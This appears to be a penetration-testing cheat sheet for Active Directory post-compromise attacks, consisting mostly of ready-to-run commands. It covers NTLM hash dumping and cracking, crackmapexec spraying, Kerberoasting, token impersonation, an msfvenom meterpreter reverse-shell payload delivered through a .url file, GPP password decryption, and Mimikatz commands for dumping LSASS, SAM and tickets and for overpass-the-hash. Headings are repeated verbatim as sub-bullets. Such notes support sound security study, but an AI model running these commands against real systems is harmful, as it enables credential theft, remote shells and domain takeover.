
* **Pass Attacks Overview**: Understand various pass-the-hash attacks.
	- Understand various pass-the-hash attacks.
* **Dumping and Cracking Hashes**: Extract and crack hashed passwords.
	- Extract and crack hashed passwords.
		```bash
		secretsdump.py -just-dc-ntlm domain/administrator@192.168.57.45
		hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -O
		john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --fork=4
		```
- **Crackmapexec**
	```bash
	sudo crackmapexec smb 192.168.57.0/24 -u user -d group.local -p pass
	```
* **Kerberoasting Walkthrough**: Exploit Kerberos vulnerabilities.
	- Exploit Kerberos vulnerabilities.
		```bash
		sudo GetUserSPNs.py X.local/user:pass -dc-ip 192.168.57.45  -request
		```
* **Token Impersonation Walkthrough**: Impersonate user tokens.
	- Impersonate user tokens.
		```bash
		incognito.py
		```
* **URL File Attacks**: Exploit URL files for attacks.
	- Exploit URL files for attacks.
		```bash
		msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.57.45 LPORT=4444 -f url > payload.url
		```
* **GPP / cPassword Attacks and Mitigations**: Exploit Group Policy Preferences.
	- Exploit Group Policy Preferences.
		```bash
		gpp-decrypt
		```
* **Credential Dumping with Mimikatz**: Use Mimikatz for credential extraction.
	- Use Mimikatz for credential extraction.
		```bash
		mimikatz
		# Elevate to highest integrity level
			# privilege::debug
			# token::elevate
		# List available options
			# sekurlsa::
		# Dump Hashes in LSASS
			# sekurlsa::logonpasswords
		# Dump SAM
			# lsadump::sam
		# Dump Cached TGTs
			# sekurlsa::tickets
		# Overpass the Hash
			# sekurlsa::pth /user:username /ntlm:hash-here /domain:domain.tld
```

* **Post-Compromise Attack Strategy**: Plan post-compromise strategies.
	- Plan post-compromise strategies.
